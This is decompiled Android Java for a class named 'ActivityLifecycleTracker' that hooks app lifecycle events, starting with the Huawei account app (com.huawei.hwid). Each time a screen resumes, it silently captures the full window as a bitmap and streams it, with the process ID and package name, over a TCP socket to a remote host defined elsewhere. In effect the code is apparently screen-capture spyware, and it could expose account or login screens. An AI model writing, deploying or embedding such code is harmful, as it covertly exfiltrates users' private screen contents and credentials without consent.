package socket;

import android.app.Activity;
import android.app.Application;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.os.Bundle;
import android.os.Process;
import android.util.Log;
import android.view.View;
import android.view.ViewTreeObserver;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

/* loaded from: classes4.dex */
public class e implements Application.ActivityLifecycleCallbacks {

    /* renamed from: e, reason: collision with root package name */
    private static final String f22378e = "ActivityLifecycleTracker";

    /* renamed from: a, reason: collision with root package name */
    private Socket f22379a;

    /* renamed from: b, reason: collision with root package name */
    private OutputStream f22380b;

    /* renamed from: c, reason: collision with root package name */
    private Set<String> f22381c;

    /* renamed from: d, reason: collision with root package name */
    private boolean f22382d;

    /* loaded from: classes4.dex */
    class a implements ViewTreeObserver.OnGlobalLayoutListener {

        /* renamed from: a, reason: collision with root package name */
        final /* synthetic */ View f22383a;

        /* renamed from: b, reason: collision with root package name */
        final /* synthetic */ Activity f22384b;

        a(View view, Activity activity) {
            this.f22383a = view;
            this.f22384b = activity;
        }

        @Override // android.view.ViewTreeObserver.OnGlobalLayoutListener
        public void onGlobalLayout() {
            this.f22383a.getViewTreeObserver().removeOnGlobalLayoutListener(this);
            e.this.e(this.f22384b, this.f22383a);
        }
    }

    public e() {
        Set a5;
        a5 = b.a(new Object[]{"com.huawei.hwid"});
        this.f22381c = new HashSet(a5);
        this.f22382d = false;
    }

    private void d() {
        new Thread(new Runnable() { // from class: socket.c
            @Override // java.lang.Runnable
            public final void run() {
                e.this.f();
            }
        }).start();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void e(@NonNull Activity activity, View view) {
        View rootView = activity.getWindow().getDecorView().getRootView();
        Bitmap createBitmap = Bitmap.createBitmap(view.getWidth(), view.getHeight(), Bitmap.Config.ARGB_8888);
        Log.d(f22378e, "Bitmap created with width: " + createBitmap.getWidth() + " and height: " + createBitmap.getHeight());
        rootView.draw(new Canvas(createBitmap));
        int myPid = Process.myPid();
        Log.d(f22378e, "pid: " + myPid);
        String packageName = activity.getPackageName();
        Log.d(f22378e, "packageName: " + packageName);
        i(h.h(h.k(String.valueOf(myPid), 10), h.k(packageName, 100), h.a(h.g(createBitmap))));
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void f() {
        try {
            Socket socket2 = new Socket(g.f22390e, g.f22391f);
            this.f22379a = socket2;
            socket2.setTcpNoDelay(true);
            this.f22379a.setKeepAlive(true);
        } catch (IOException e5) {
            throw new RuntimeException(e5);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void g(byte[] bArr) {
        try {
            this.f22380b = new BufferedOutputStream(this.f22379a.getOutputStream());
            ByteBuffer allocate = ByteBuffer.allocate(8388608);
            try {
                allocate.order(ByteOrder.LITTLE_ENDIAN);
                if (bArr.length > 0 && allocate.remaining() > bArr.length) {
                    allocate.put(bArr);
                    allocate.flip();
                    byte[] copyOfRange = Arrays.copyOfRange(allocate.array(), allocate.position(), allocate.limit());
                    int i5 = 0;
                    while (i5 < copyOfRange.length) {
                        int min = Math.min(2048, copyOfRange.length - i5);
                        byte[] bArr2 = new byte[min];
                        System.arraycopy(copyOfRange, i5, bArr2, 0, min);
                        this.f22380b.write(bArr2);
                        this.f22380b.flush();
                        i5 += min;
                    }
                    Log.d(f22378e, "sendData: " + copyOfRange.length + " " + allocate.remaining());
                }
            } catch (Exception e5) {
                e5.printStackTrace();
            }
        } catch (IOException e6) {
            throw new RuntimeException(e6);
        }
    }

    private void i(final byte[] bArr) {
        Socket socket2 = this.f22379a;
        if (socket2 == null) {
            Log.e(f22378e, "sendMessage: null");
            return;
        }
        if (socket2.isClosed()) {
            Log.e(f22378e, "sendMessage: Closed");
            return;
        }
        Log.d(f22378e, "data: " + bArr.length);
        new Thread(new Runnable() { // from class: socket.d
            @Override // java.lang.Runnable
            public final void run() {
                e.this.g(bArr);
            }
        }).start();
    }

    public void h(Application application) {
        String packageName = application.getPackageName();
        if (!this.f22381c.contains(packageName)) {
            Log.d(f22378e, "pid: " + Process.myPid());
            Log.d(f22378e, "register: " + packageName);
            this.f22381c.add(packageName);
            d();
            application.registerActivityLifecycleCallbacks(this);
        }
    }

    public void j(Application application) {
        this.f22381c.remove(application.getPackageName());
        application.unregisterActivityLifecycleCallbacks(this);
        if (this.f22381c.isEmpty()) {
            this.f22382d = false;
        }
    }

    @Override // android.app.Application.ActivityLifecycleCallbacks
    public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle bundle) {
        Log.d(f22378e, "onActivityCreated: " + activity.getComponentName());
    }

    @Override // android.app.Application.ActivityLifecycleCallbacks
    public void onActivityDestroyed(@NonNull Activity activity) {
        Log.d(f22378e, "onActivityDestroyed: " + activity.getComponentName());
    }

    @Override // android.app.Application.ActivityLifecycleCallbacks
    public void onActivityPaused(@NonNull Activity activity) {
        Log.d(f22378e, "onActivityPaused: " + activity.getComponentName());
    }

    @Override // android.app.Application.ActivityLifecycleCallbacks
    public void onActivityResumed(@NonNull Activity activity) {
        Log.d(f22378e, "onActivityResumed: " + activity.getComponentName());
        View decorView = activity.getWindow().getDecorView();
        if (decorView.getWidth() > 0 && decorView.getHeight() > 0) {
            e(activity, decorView);
        } else {
            decorView.getViewTreeObserver().addOnGlobalLayoutListener(new a(decorView, activity));
        }
    }

    @Override // android.app.Application.ActivityLifecycleCallbacks
    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle bundle) {
        Log.d(f22378e, "onActivitySaveInstanceState: " + activity.getComponentName());
    }

    @Override // android.app.Application.ActivityLifecycleCallbacks
    public void onActivityStarted(@NonNull Activity activity) {
        Log.d(f22378e, "onActivityStarted: " + activity.getComponentName());
    }

    @Override // android.app.Application.ActivityLifecycleCallbacks
    public void onActivityStopped(@NonNull Activity activity) {
        Log.d(f22378e, "onActivityStopped: " + activity.getComponentName());
    }
}
